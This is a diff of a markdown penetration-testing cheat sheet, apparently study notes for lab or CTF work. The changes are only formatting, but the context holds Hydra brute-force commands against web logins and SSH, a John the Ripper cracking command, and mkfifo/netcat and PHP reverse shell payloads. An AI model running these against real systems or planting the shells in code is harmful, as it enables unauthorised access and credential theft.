@@ -342,14 +342,14 @@ searchsploit -u
 
 - Hydra  
 
-Web basic authentication :
+**Web basic authentication :**
 ```
 hydra -l $USER -P $WORDLIST $HOST -s $PORT http-get /$DIRECTORY/$PATH
 ```
 Example :  
 `hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -s 8080 /example/directory`  
 
-Web FORM Post :
+**Web FORM Post :**
 ```
 hydra -l $USER -P $WORDLIST $HOST http-post-form "/:username=^USER^&password=^PASS^&Login=Login:invalid"
 ```
@@ -357,7 +357,7 @@ Example :
 `hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^&Login=Login:invalid"`  
 **Replace values accordingly (username, password, etc.)**  
 
-SSH :  
+**SSH :**  
 ```
 hydra -l $USER -P $WORDLIST ssh://$HOST:$PORT
 ```
@@ -380,18 +380,20 @@ Example (Kerberoast) :
 ```
 john $HASH $WORDLIST
 ```
-It's often as easy as "give him the password and the wordlist and let him do its thing", it automatically find the correct hash format and attempt to crack it.  
+It's often as easy as "give him the password and the wordlist and let him do its thing", it automatically finds the correct hash format and attempt to crack it.  
 
 ## Payloads
 
 Some reverse shell payloads I've found successful :  
 
 - shell  
+
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
 ```
 
 - PHP  
+
 ```
 <?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
 ```
